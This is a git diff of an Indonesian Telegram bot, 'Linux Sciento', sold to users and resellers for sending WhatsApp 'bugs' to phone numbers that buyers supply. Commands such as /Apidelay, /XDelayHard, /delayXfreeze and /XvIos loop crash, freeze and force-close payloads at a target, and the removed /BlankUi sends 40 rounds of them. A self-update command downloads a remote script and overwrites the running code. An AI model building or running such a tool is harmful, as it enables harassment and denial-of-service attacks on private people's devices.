-        message: () => "```Js\n𖥂 Linux Sciento 𖥂\nPowerful • Secure • Exclusive\n\nOwners : @ItsImLxanderX5\nMy Best Friend : @penzoyzy29\n\nHarga Users : Rp25.000\nHarga Reseller : Rp30.000\n\nKlik button di bawah untuk melanjutkan\n```",
-        keyboard: (currentPage, totalPages) => [
-            [
-                { text: "◀ Back", callback_data: "nav_prev", disabled: currentPage === 0, style: "danger" },
-                { text: `${currentPage + 1}/${totalPages}`, callback_data: "nav_page", style: "primary" },
-                { text: "Next ▶", callback_data: "nav_next", disabled: currentPage === totalPages - 1, style: "success" }
-            ],
-            [
-                { text: "Owner", url: "https://t.me/ItsImLxanderX5", style: "primary" }
-            ]
-        ]
-    },
-    1: {
-        name: "owner_menu",
-        message: () => "```Js\n⬡═—⊱ AKSES OWNER ⊰—═⬡\n• /addowner → TAMBAH OWNER\n• /delowner → HAPUS OWNER\n• /addadmin → TAMBAH ADMIN\n• /deladmin → HAPUS ADMIN\n• /addprem → TAMBAH PREMIUM\n• /delprem → HAPUS PREMIUM\n• /setcd → SETTING COOLDOWN\n• /addbot → TAMBAH SENDER\n• /dellbot → HAPUS SENDER\n• /listbot → CEK SENDER AKTIF\n• /pullupdate → UPDATE SCRIPT\n\n⬡═—⊱ AKSES ADMIN ⊰—═⬡\n• /addprem → TAMBAH PREMIUM\n• /delprem → HAPUS PREMIUM\n• /setcd → SETTING COOLDOWN\n• /addbot → TAMBAH SENDER\n• /dellbot → HAPUS SENDER\n• /listbot → CEK SENDER AKTIF\n```",
-        keyboard: (currentPage, totalPages) => [
-            [
-                { text: "◀ Back", callback_data: "nav_prev", disabled: currentPage === 0, style: "danger" },
-                { text: `${currentPage + 1}/${totalPages}`, callback_data: "nav_page", style: "primary" },
-                { text: "Next ▶", callback_data: "nav_next", disabled: currentPage === totalPages - 1, style: "success" }
-            ],
-            [
-                { text: "Owner", url: "https://t.me/ItsImLxanderX5", style: "primary" }
-            ]
-        ]
-    },
-    2: {
-        name: "bug_menu",
-        message: () => "```Js\n⬡═—⊱ BEBAS SPAM BUG ⊰—═⬡\n• /xbug → BEBAS SPAM BUG \n• /xspam → BEBAS SPAM BUG \n\n⬡═—⊱ IPHONE BUG ⊰—═⬡\n• /xcios → FORCE CLOSE IOS \n\n⬡═—⊱ ANDROID BUG ⊰—═⬡\n• /xandro → BLANK STUCK DEVICE\n• /xforce → FORCE CLOSE ANDROID\n• /xperma → DELAY PERMANENT \n• /xdelay → DELAY HARD INVISIBLE \n• /Adelay → DELAY INVISIBLE ANDROID\n• /xcall → FRANK SPAM CALL X VIDIO\n• /hapusbug → HAPUS BUG YANG DI KIRIM\n```",
-        keyboard: (currentPage, totalPages) => [
-            [
-                { text: "◀ Back", callback_data: "nav_prev", disabled: currentPage === 0, style: "danger" },
-                { text: `${currentPage + 1}/${totalPages}`, callback_data: "nav_page", style: "primary" },
-                { text: "Next ▶", callback_data: "nav_next", disabled: currentPage === totalPages - 1, style: "success" }
-            ],
-            [
-                { text: "Owner", url: "https://t.me/ItsImLxanderX5", style: "primary" }
-            ]
-        ]
-    },
-    3: {
-        name: "support_menu",
-        message: () => "```Js\n╭━━━〔 🌑 LINUX SCIENTO BEST SUPPORT 🌑 〕━━━╮\n\n┌─〔 CORE SUPPORT 〕\n│ ✦ @Allah        ➤ Endless Blessing\n│ ✦ @Ortu         ➤ Real Life Backbone\n└────────────────────\n\n┌─〔 LINUX SCIENTO TEAM 〕\n│ ✦ @penzoyzy29\n│ ✦ @ItsImLxanderX5\n│ ✦ @arshadeva\n│ ✦ All buyer and member Linux Sciento\n└────────────────────\n\n┌─〔 SPECIAL THANKS 〕\n│ ✦ Semua Member Linux Sciento\n│ ✦ Semua Yang Pernah Support\n└────────────────────\n\n╰━━━〔 LINUX NEVER DIE 〕━━━╯\n\nSecurity Script : ACTIVE\nKing : @ItsImLxanderX5\nFriend: @penzoyzy29\n```",
-        keyboard: (currentPage, totalPages) => [
-            [
-                { text: "◀ Back", callback_data: "nav_prev", disabled: currentPage === 0, style: "danger" },
-                { text: `${currentPage + 1}/${totalPages}`, callback_data: "nav_page", style: "primary" },
-                { text: "Next ▶", callback_data: "nav_next", disabled: currentPage === totalPages - 1, style: "success" }
-            ],
-            [
-                { text: "Owner", url: "https://t.me/ItsImLxanderX5", style: "primary" }
-            ]
-        ]
-    }
-};
+// Halaman 0 - MENU UTAMA
+const mainMenuMessage = (Name, waktuRunPanel) => `\`\`\`Js
+𖥂 Linux Sciento 𖥂
+Powerful • Secure • Exclusive
 
-const totalPages = Object.keys(pages).length;
+Owners : @ItsImLxanderX5
+My Best Friend : @penzoyzy29
 
-const getKeyboard = (currentPage) => {
-    const pageData = pages[currentPage];
-    const keyboardRaw = pageData.keyboard(currentPage, totalPages);
-    const inlineKeyboard = keyboardRaw.map(row =>
-        row.map(btn => {
-            if (btn.url) {
-                return { text: btn.text, url: btn.url };
-            } else {
-                const button = { text: btn.text, callback_data: btn.callback_data };
-                if (btn.style === "danger") {
-                    return { ...button, style: "danger" };
-                } else if (btn.style === "primary") {
-                    return { ...button, style: "primary" };
-                } else if (btn.style === "success") {
-                    return { ...button, style: "success" };
+Harga Users : Rp25.000
+Harga Reseller : Rp30.000
+
+Klik button di bawah untuk melanjutkan
+\`\`\``;
+
+// Halaman 1 - OWNER MENU
+const ownerMenuMessage = `\`\`\`Js
+⬡═—⊱ AKSES OWNER ⊰—═⬡
+• /addowner → TAMBAH OWNER
+• /delowner → HAPUS OWNER
+• /addadmin → TAMBAH ADMIN
+• /deladmin → HAPUS ADMIN
+• /addprem → TAMBAH PREMIUM
+• /delprem → HAPUS PREMIUM
+• /setcd → SETTING COOLDOWN
+• /addbot → TAMBAH SENDER
+• /delbot → HAPUS SENDER
+• /listbot → CEK SENDER AKTIF
+• /pullupdate → UPDATE SCRIPT
+
+⬡═—⊱ AKSES ADMIN ⊰—═⬡
+• /addprem → TAMBAH PREMIUM
+• /delprem → HAPUS PREMIUM
+• /setcd → SETTING COOLDOWN
+• /addbot → TAMBAH SENDER
+• /delbot → HAPUS SENDER
+• /listbot → CEK SENDER AKTIF
+\`\`\``;
+
+// Halaman 2 - BUG MENU
+const bugMenuMessage = `\`\`\`Js
+⬡═—⊱ BUG MENU ⊰—═⬡
+• /Apidelay → DELAY INVISIBLE
+• /XDelayHard → DELAY HARD INVISIBLE
+• /delayXfreeze → FREEZE INVISIBLE
+• /XvIos → FORCE CLOSE IOS
+• /hapusbug → HAPUS BUG YANG DIKIRIM
+\`\`\``;
+
+// Halaman 3 - SUPPORT MENU
+const supportMenuMessage = `\`\`\`Js
+╭━━━〔 LINUX SCIENTO BEST SUPPORT 〕━━━╮
+
+┌─〔 CORE SUPPORT 〕
+│ ✦ @Allah        ➤ Endless Blessing
+│ ✦ @Ortu         ➤ Real Life Backbone
+└────────────────────
+
+┌─〔 LINUX SCIENTO TEAM 〕
+│ ✦ @penzoyzy29
+│ ✦ @ItsImLxanderX5
+│ ✦ @arshadeva
+│ ✦ All buyer and member Linux Sciento
+└────────────────────
+
+┌─〔 SPECIAL THANKS 〕
+│ ✦ Semua Member Linux Sciento
+│ ✦ Semua Yang Pernah Support
+└────────────────────
+
+╰━━━〔 LINUX NEVER DIE 〕━━━╯
+
+Security Script : ACTIVE
+King : @ItsImLxanderX5
+Friend: @penzoyzy29
+\`\`\``;
+
+// Keyboard untuk setiap halaman
+const getKeyboard = (currentPage, totalPages) => {
+    const keyboard = [
+        [
+            { text: "◀ Back", callback_data: "nav_prev", disabled: currentPage === 0, style: "danger" },
+            { text: `${currentPage + 1}/${totalPages}`, callback_data: "nav_page", style: "primary" },
+            { text: "Next ▶", callback_data: "nav_next", disabled: currentPage === totalPages - 1, style: "success" }
+        ],
+        [
+            { text: "Owner", url: "https://t.me/ItsImLxanderX5", style: "primary" }
+        ]
+    ];
+    
+    return {
+        inline_keyboard: keyboard.map(row =>
+            row.map(btn => {
+                if (btn.url) {
+                    return { text: btn.text, url: btn.url };
+                } else {
+                    const button = { text: btn.text, callback_data: btn.callback_data };
+                    if (btn.style === "danger") return { ...button, style: "danger" };
+                    if (btn.style === "primary") return { ...button, style: "primary" };
+                    if (btn.style === "success") return { ...button, style: "success" };
+                    return button;
                 }
-                return button;
-            }
-        })
-    );
-    return { inline_keyboard: inlineKeyboard };
+            })
+        )
+    };
 };
 
 // Handler navigasi
@@ -709,6 +655,8 @@ bot.action(/nav_(prev|next|page)/, async (ctx) => {
     const action = ctx.match[1];
     const currentPage = ctx.session?.currentPage || 0;
     let newPage = currentPage;
+    
+    const totalPages = 4;
 
     if (action === 'prev' && currentPage > 0) {
         newPage = currentPage - 1;
@@ -720,22 +668,29 @@ bot.action(/nav_(prev|next|page)/, async (ctx) => {
 
     if (newPage !== currentPage) {
         ctx.session.currentPage = newPage;
-        const pageData = pages[newPage];
+        const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
+        const waktuRunPanel = getUptime();
+        
+        let caption = "";
+        if (newPage === 0) caption = mainMenuMessage(Name, waktuRunPanel);
+        else if (newPage === 1) caption = ownerMenuMessage;
+        else if (newPage === 2) caption = bugMenuMessage;
+        else caption = supportMenuMessage;
 
         const media = {
             type: "photo",
             media: getRandomImage(),
-            caption: pageData.message(),
+            caption: caption,
             parse_mode: "Markdown"
         };
 
         try {
-            await ctx.editMessageMedia(media, { reply_markup: getKeyboard(newPage) });
+            await ctx.editMessageMedia(media, { reply_markup: getKeyboard(newPage, totalPages) });
         } catch (err) {
             await ctx.replyWithPhoto(media.media, {
                 caption: media.caption,
                 parse_mode: media.parse_mode,
-                reply_markup: getKeyboard(newPage)
+                reply_markup: getKeyboard(newPage, totalPages)
             });
         }
     }
@@ -744,37 +699,36 @@ bot.action(/nav_(prev|next|page)/, async (ctx) => {
 
 // Command /start
 bot.start(async (ctx) => {
+    const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
+    const waktuRunPanel = getUptime();
+    
     ctx.session = ctx.session || {};
     ctx.session.currentPage = 0;
 
     await ctx.replyWithPhoto(getRandomImage(), {
-        caption: pages[0].message(),
+        caption: mainMenuMessage(Name, waktuRunPanel),
         parse_mode: "Markdown",
-        reply_markup: getKeyboard(0)
+        reply_markup: getKeyboard(0, 4)
     });
 });
 
 // ======================= COMMAND BUG =======================
 bot.command("Apidelay", checkWA, checkPremium, async (ctx) => {
+    if (!checkCooldown(ctx, "Apidelay")) return;
+    
     let target = ctx.message.text.split(" ")[1];
     if (!target) return ctx.reply(`Example: /Apidelay 62xxxx`);
     target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
     await ctx.sendPhoto("https://files.catbox.moe/o1hm0u.jpg", {
-        caption: `
-\`\`\`Js
-交 𝖪𝗒𝗓𝗓Хороший_ ᝄ
-─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.
-
-" バグ情報
+        caption: `\`\`\`Js
 ☇ Target: ${target}
 ☇ Status: Succes
 ☇ Type: /Apidelay 
-\`\`\`
-`,
+\`\`\``,
         parse_mode: "Markdown",
         reply_markup: {
-            inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${target.split("@")[0]}` }]],
+            inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${target.split("@")[0]}` }]],
         },
     });
 
@@ -788,25 +742,21 @@ bot.command("Apidelay", checkWA, checkPremium, async (ctx) => {
 });
 
 bot.command("XDelayHard", checkWA, checkPremium, async (ctx) => {
+    if (!checkCooldown(ctx, "XDelayHard")) return;
+    
     let target = ctx.message.text.split(" ")[1];
     if (!target) return ctx.reply(`Example: /XDelayHard 62xxxx`);
     target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
     await ctx.sendPhoto("https://files.catbox.moe/o1hm0u.jpg", {
-        caption: `
-\`\`\`Js
-交 ℒιиυχιиנєк ᝄ
-─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.
-
-" バグ情報
+        caption: `\`\`\`Js
 ☇ Target: ${target}
 ☇ Status: Succes
 ☇ Type: /XDelayHard 
-\`\`\`
-`,
+\`\`\``,
         parse_mode: "Markdown",
         reply_markup: {
-            inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${target.split("@")[0]}` }]],
+            inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${target.split("@")[0]}` }]],
         },
     });
 
@@ -819,25 +769,21 @@ bot.command("XDelayHard", checkWA, checkPremium, async (ctx) => {
 });
 
 bot.command("delayXfreeze", checkWA, checkPremium, async (ctx) => {
+    if (!checkCooldown(ctx, "delayXfreeze")) return;
+    
     let target = ctx.message.text.split(" ")[1];
     if (!target) return ctx.reply(`Example: /delayXfreeze 62xxxx`);
     target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
     await ctx.sendPhoto("https://files.catbox.moe/o1hm0u.jpg", {
-        caption: `
-\`\`\`Js
-交 ℒιиυχιиנєк ᝄ
-─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.
-
-" バグ情報
+        caption: `\`\`\`Js
 ☇ Target: ${target}
 ☇ Status: Succes
 ☇ Type: /delayXfreeze 
-\`\`\`
-`,
+\`\`\``,
         parse_mode: "Markdown",
         reply_markup: {
-            inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${target.split("@")[0]}` }]],
+            inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${target.split("@")[0]}` }]],
         },
     });
 
@@ -851,25 +797,21 @@ bot.command("delayXfreeze", checkWA, checkPremium, async (ctx) => {
 });
 
 bot.command("XvIos", checkWA, checkPremium, async (ctx) => {
+    if (!checkCooldown(ctx, "XvIos")) return;
+    
     let target = ctx.message.text.split(" ")[1];
     if (!target) return ctx.reply(`Example: /XvIos 62xxxx`);
     target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
     await ctx.sendPhoto("https://files.catbox.moe/o1hm0u.jpg", {
-        caption: `
-\`\`\`Js
-交 ℒιиυχιиנєк ᝄ
-─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.
-
-" バグ情報
+        caption: `\`\`\`Js
 ☇ Target: ${target}
 ☇ Status: Succes
 ☇ Type: /XvIos 
-\`\`\`
-`,
+\`\`\``,
         parse_mode: "Markdown",
         reply_markup: {
-            inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${target.split("@")[0]}` }]],
+            inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${target.split("@")[0]}` }]],
         },
     });
 
@@ -882,38 +824,42 @@ bot.command("XvIos", checkWA, checkPremium, async (ctx) => {
     })();
 });
 
-bot.command("BlankUi", checkWA, checkPremium, async (ctx) => {
+bot.command("hapusbug", checkWA, checkPremium, async (ctx) => {
+    if (!checkCooldown(ctx, "hapusbug")) return;
+    
     let target = ctx.message.text.split(" ")[1];
-    if (!target) return ctx.reply(`Example: /BlankUi 62xxxx`);
-    target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-
+    if (!target) return ctx.reply(`Example: /hapusbug 62xxxx`);
+    target = target.replace(/[^0-9]/g, "");
+    
+    if (target.startsWith('0')) {
+        return ctx.reply(`Contoh : /hapusbug 628xxxx`);
+    }
+    
+    let jid = target + '@s.whatsapp.net';
+    
     await ctx.sendPhoto("https://files.catbox.moe/o1hm0u.jpg", {
-        caption: `
-\`\`\`Js
-交 ℒιиυχιиנєк" ᝄ
-─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.
-
-" バグ情報
+        caption: `\`\`\`Js
 ☇ Target: ${target}
 ☇ Status: Succes
-☇ Type: /BlankUi
-\`\`\`
-`,
+☇ Type: /hapusbug
+\`\`\``,
         parse_mode: "Markdown",
         reply_markup: {
-            inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${target.split("@")[0]}` }]],
+            inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${target}` }]],
         },
     });
 
     (async () => {
-        for (let i = 0; i < 40; i++) {
-            console.log(chalk.red(`Send Bug BlankUi ${i + 1}/40 To ${target}`));
-            await VnXUi(sock, target);
-            await sleep(1000);
-            await VnXDeck(sock, target);
-            await sleep(800);
-            await VnXLocaUiNew(sock, target);
-            await sleep(5000);
+        try {
+            for (let i = 0; i < 3; i++) {
+                console.log(chalk.red(`Send Clear Bug ${i + 1} To ${target}`));
+                await hapusBug(sock, jid);
+                await sleep(1000);
+            }
+            await ctx.reply("Done Clear Bug By Linux Sciento");
+        } catch (err) {
+            console.error("Error:", err);
+            await ctx.reply("Ada kesalahan saat mengirim bug.");
         }
     })();
 });
@@ -921,104 +867,93 @@ bot.command("BlankUi", checkWA, checkPremium, async (ctx) => {
 // ======================= COMMAND ADMIN & OWNER =======================
 bot.command("addowner", checkOwner, (ctx) => {
     const args = ctx.message.text.split(" ");
-    if (args.length < 2) {
-        return ctx.reply("❌ Format Salah!. Example: /addowner 12345678");
-    }
+    if (args.length < 2) return ctx.reply("Format Salah!. Example: /addowner 12345678");
     const userId = args[1];
-    if (ownerUsers.includes(userId)) {
-        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status owner.`);
-    }
+    if (ownerUsers.includes(userId)) return ctx.reply(`Pengguna ${userId} sudah memiliki status owner.`);
     addOwner(userId);
-    return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses owner!`);
+    return ctx.reply(`Pengguna ${userId} sekarang memiliki akses owner!`);
 });
 
 bot.command("delowner", checkOwner, (ctx) => {
     const args = ctx.message.text.split(" ");
-    if (args.length < 2) {
-        return ctx.reply("❌ Format Salah!. Example: /delowner 12345678");
-    }
+    if (args.length < 2) return ctx.reply("Format Salah!. Example: /delowner 12345678");
     const userId = args[1];
-    if (!ownerUsers.includes(userId)) {
-        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Owner.`);
-    }
+    if (!ownerUsers.includes(userId)) return ctx.reply(`Pengguna ${userId} tidak ada dalam daftar Owner.`);
     removeOwner(userId);
-    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Owner.`);
+    return ctx.reply(`Pengguna ${userId} telah dihapus dari daftar Owner.`);
 });
 
-bot.command("Addadmin", checkOwner, (ctx) => {
+bot.command("addadmin", checkOwner, (ctx) => {
     const args = ctx.message.text.split(" ");
-    if (args.length < 2) {
-        return ctx.reply("❌ Format Salah!. Example: /Addadmin 12345678");
-    }
+    if (args.length < 2) return ctx.reply("Format Salah!. Example: /addadmin 12345678");
     const userId = args[1];
-    if (adminUsers.includes(userId)) {
-        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
-    }
+    if (adminUsers.includes(userId)) return ctx.reply(`Pengguna ${userId} sudah memiliki status admin.`);
     addAdmin(userId);
-    return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
-});
-
-bot.command("Addprem", checkOwner, (ctx) => {
-    const args = ctx.message.text.trim().split(" ");
-    if (args.length < 2) {
-        return ctx.reply("❌ Format Salah!. Example : /Addprem 12345678");
-    }
-    const userId = args[1].toString();
-    if (premiumUsers.includes(userId)) {
-        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
-    }
-    addPremium(userId);
-    return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
+    return ctx.reply(`Pengguna ${userId} sekarang memiliki akses admin!`);
 });
 
 bot.command("deladmin", checkOwner, (ctx) => {
     const args = ctx.message.text.split(" ");
-    if (args.length < 2) {
-        return ctx.reply("❌ Format Salah!. Example : /deladmin 12345678");
-    }
+    if (args.length < 2) return ctx.reply("Format Salah!. Example: /deladmin 12345678");
     const userId = args[1];
-    if (!adminUsers.includes(userId)) {
-        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
-    }
+    if (!adminUsers.includes(userId)) return ctx.reply(`Pengguna ${userId} tidak ada dalam daftar Admin.`);
     removeAdmin(userId);
-    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
+    return ctx.reply(`Pengguna ${userId} telah dihapus dari daftar Admin.`);
 });
 
-bot.command("Delprem", checkOwner, (ctx) => {
+bot.command("addprem", checkOwner, (ctx) => {
     const args = ctx.message.text.trim().split(" ");
-    if (args.length < 2) {
-        return ctx.reply("❌ Format Salah!. Example : /Delprem 12345678");
-    }
+    if (args.length < 2) return ctx.reply("Format Salah!. Example : /addprem 12345678");
     const userId = args[1].toString();
-    if (!premiumUsers.includes(userId)) {
-        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
-    }
+    if (premiumUsers.includes(userId)) return ctx.reply(`Pengguna ${userId} sudah memiliki akses premium.`);
+    addPremium(userId);
+    return ctx.reply(`Pengguna ${userId} sekarang adalah premium.`);
+});
+
+bot.command("delprem", checkOwner, (ctx) => {
+    const args = ctx.message.text.trim().split(" ");
+    if (args.length < 2) return ctx.reply("Format Salah!. Example : /delprem 12345678");
+    const userId = args[1].toString();
+    if (!premiumUsers.includes(userId)) return ctx.reply(`Pengguna ${userId} tidak ada dalam daftar premium.`);
     removePremium(userId);
-    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
+    return ctx.reply(`Pengguna ${userId} telah dihapus dari akses premium.`);
 });
 
-bot.command("Cekprem", (ctx) => {
+bot.command("cekprem", (ctx) => {
     const userId = ctx.from.id.toString();
-    if (premiumUsers.includes(userId)) {
-        return ctx.reply(`✅ Anda adalah pengguna premium.`);
-    } else {
-        return ctx.reply(`❌ Anda bukan pengguna premium.`);
-    }
+    if (premiumUsers.includes(userId)) return ctx.reply(`Anda adalah pengguna premium.`);
+    else return ctx.reply(`Anda bukan pengguna premium.`);
 });
 
-// Command untuk pairing WhatsApp
-bot.command("Addsender", checkOwner, async (ctx) => {
+// ======================= SET COOLDOWN =======================
+bot.command("setcd", checkOwner, async (ctx) => {
     const args = ctx.message.text.split(" ");
-    if (args.length < 2) {
-        return await ctx.reply("❌ Format Salah!. Example : /Addsender 62812xxxx");
-    }
+    if (args.length < 3) return ctx.reply("Format Salah!. Example: /setcd Apidelay 5d\n\nd = detik\nm = menit\nj = jam");
+    
+    const command = args[1];
+    const durationStr = args[2];
+    
+    let duration = parseInt(durationStr);
+    const unit = durationStr.slice(-1);
+    
+    if (unit === 'd') {}
+    else if (unit === 'm') duration = duration * 60;
+    else if (unit === 'j') duration = duration * 3600;
+    else duration = parseInt(durationStr);
+    
+    setCooldown(command, duration);
+    return ctx.reply(`Cooldown untuk /${command} telah diatur ke ${durationStr}`);
+});
+
+// ======================= ADDBOT =======================
+bot.command("addbot", checkOwner, async (ctx) => {
+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) return await ctx.reply("Format Salah!. Example : /addbot 62812xxxx");
 
     let phoneNumber = args[1];
     phoneNumber = phoneNumber.replace(/[^0-9]/g, "");
 
-    if (sock && sock.user && isWhatsAppConnected) {
-        return await ctx.reply("✅ WhatsApp sudah terhubung!");
-    }
+    if (sock && sock.user && isWhatsAppConnected) return await ctx.reply("WhatsApp sudah terhubung!");
 
     try {
         if (!sock) {
@@ -1030,18 +965,16 @@ bot.command("Addsender", checkOwner, async (ctx) => {
         const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
 
         const sentMsg = await ctx.replyWithPhoto(getRandomImage(), {
-            caption: `
-\`\`\`Js
+            caption: `\`\`\`Js
 ┏━━━━━━━━━━━━━━━━━━━━
-┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
-┃☇ 𝗖𝗼𝗱𝗲 : ${formattedCode}
-┃☇ 𝗦𝘁𝗮𝘁𝘂𝘀 : ⏳ Menunggu Koneksi...
+┃☇ Nomor : ${phoneNumber}
+┃☇ Code : ${formattedCode}
+┃☇ Status : Menunggu Koneksi...
 ┗━━━━━━━━━━━━━━━━━━━━
-\`\`\`
-`,
+\`\`\``,
             parse_mode: "Markdown",
             reply_markup: {
-                inline_keyboard: [[{ text: "❌ Batalkan", callback_data: "Close" }]],
+                inline_keyboard: [[{ text: "Batalkan", callback_data: "Close" }]],
             },
         });
 
@@ -1052,64 +985,59 @@ bot.command("Addsender", checkOwner, async (ctx) => {
 
     } catch (error) {
         console.error(chalk.red("Gagal melakukan pairing:"), error);
-        await ctx.reply("❌ Gagal melakukan pairing! Pastikan nomor WhatsApp valid.");
+        await ctx.reply("Gagal melakukan pairing! Pastikan nomor WhatsApp valid.");
+    }
+});
+
+// ======================= DELBOT =======================
+bot.command("delbot", checkOwner, async (ctx) => {
+    const success = deleteSession();
+    if (success) {
+        isWhatsAppConnected = false;
+        sock = null;
+        ctx.reply("Session berhasil dihapus, silahkan /addbot ulang");
+    } else {
+        ctx.reply("Tidak ada session yang tersimpan saat ini.");
+    }
+});
+
+// ======================= LISTBOT =======================
+bot.command("listbot", checkOwner, async (ctx) => {
+    try {
+        const waStatus = sock && sock.user && isWhatsAppConnected ? "Terhubung" : "Tidak Terhubung";
+        const message = `\`\`\`Js
+┏━━━━━━━━━━━━━━━━━━━━
+┃ STATUS WHATSAPP
+┣━━━━━━━━━━━━━━━━━━━━
+┃ STATUS : ${waStatus}
+${sock && sock.user ? `┃ NOMOR : ${linkedWhatsAppNumber || sock.user?.id?.split(":")[0]}` : ''}
+┗━━━━━━━━━━━━━━━━━━━━
+\`\`\``;
+        await ctx.reply(message, { parse_mode: "Markdown" });
+    } catch (error) {
+        console.error("Gagal menampilkan status bot:", error);
+        ctx.reply("Gagal menampilkan status bot.");
     }
 });
 
 bot.action("Close", async (ctx) => {
     const userId = ctx.from.id.toString();
-    if (!OWNER_IDS.includes(userId)) {
-        return ctx.answerCbQuery("Lu Siapa Kontol", { show_alert: true });
-    }
+    if (!OWNER_IDS.includes(userId)) return ctx.answerCbQuery("Lu Siapa Kontol", { show_alert: true });
     try {
         await ctx.deleteMessage();
-        if (global.pairingMessage) {
-            global.pairingMessage = null;
-        }
+        if (global.pairingMessage) global.pairingMessage = null;
     } catch (error) {
         console.error(chalk.red("Gagal menghapus pesan:"), error);
-        await ctx.answerCbQuery("❌ Gagal menghapus pesan!", { show_alert: true });
+        await ctx.answerCbQuery("Gagal menghapus pesan!", { show_alert: true });
     }
 });
 
-bot.command("Delsesi", checkOwner, async (ctx) => {
-    const success = deleteSession();
-    if (success) {
-        isWhatsAppConnected = false;
-        sock = null;
-        ctx.reply("✅ Session berhasil dihapus, silahkan /Addsender ulang");
-    } else {
-        ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
-    }
-});
-
-bot.command("Status", checkOwner, async (ctx) => {
-    try {
-        const waStatus = sock && sock.user && isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
-        const message = `
-\`\`\`Js
-┏━━━━━━━━━━━━━━━━━━━━
-┃ STATUS WHATSAPP
-┣━━━━━━━━━━━━━━━━━━━━
-┃ ⌬ STATUS : ${waStatus}
-${sock && sock.user ? `┃ ⌬ NOMOR : ${linkedWhatsAppNumber || sock.user?.id?.split(":")[0]}` : ''}
-┗━━━━━━━━━━━━━━━━━━━━
-\`\`\`
-`;
-        await ctx.reply(message, { parse_mode: "Markdown" });
-    } catch (error) {
-        console.error("Gagal menampilkan status bot:", error);
-        ctx.reply("❌ Gagal menampilkan status bot.");
-    }
-});
-
-// ======================= FITUR PULL UPDATE DUA TAHAP =======================
+// ======================= PULL UPDATE =======================
 const SCRIPT_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/linuxsciento/refs/heads/main/ovalinux.js";
-const VERSION_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/linuxsciento/refs/heads/main/ovalinux.js";
 
 bot.command("pullupdate", checkOwner, async (ctx) => {
     if (pendingUpdate) {
-        await ctx.reply("🔄 Mengupdate script...");
+        await ctx.reply("Mengupdate script...");
         
         try {
             const { data: newScript } = await axios.get(SCRIPT_RAW_URL, { timeout: 15000 });
@@ -1119,61 +1047,43 @@ bot.command("pullupdate", checkOwner, async (ctx) => {
             fs.copyFileSync(currentScriptPath, backupPath);
             fs.writeFileSync(currentScriptPath, newScript, "utf8");
             
-            await ctx.reply("✅ Update berhasil! Bot akan merestart dalam 3 detik...");
+            await ctx.reply("Update berhasil! Bot akan merestart dalam 3 detik...");
             pendingUpdate = false;
             
-            setTimeout(() => {
-                process.exit(0);
-            }, 3000);
-            
+            setTimeout(() => process.exit(0), 3000);
         } catch (error) {
             console.error(chalk.red("Gagal update:", error.message));
-            await ctx.reply(`❌ Gagal update: ${error.message}`);
+            await ctx.reply(`Gagal update: ${error.message}`);
             pendingUpdate = false;
         }
     } else {
         try {
-            const { data: versionData } = await axios.get(VERSION_RAW_URL, { timeout: 10000 });
-            const latestVersion = versionData.version || "1.0.0";
+            const { data: newScript } = await axios.get(SCRIPT_RAW_URL, { timeout: 10000 });
+            const currentScriptPath = __filename;
+            const currentScript = fs.readFileSync(currentScriptPath, "utf8");
             
-            if (latestVersion !== currentVersion) {
-                await ctx.reply(`🔍 Version Update New: ${latestVersion}\nSilahkan ketik /pullupdate lagi untuk mengupdate script.`);
+            if (currentScript !== newScript) {
+                await ctx.reply(`Update tersedia!\nSilahkan ketik /pullupdate lagi untuk mengupdate script.`);
                 pendingUpdate = true;
             } else {
-                await ctx.reply(`✅ Version masih sama: ${currentVersion}\nTidak ada update tersedia.`);
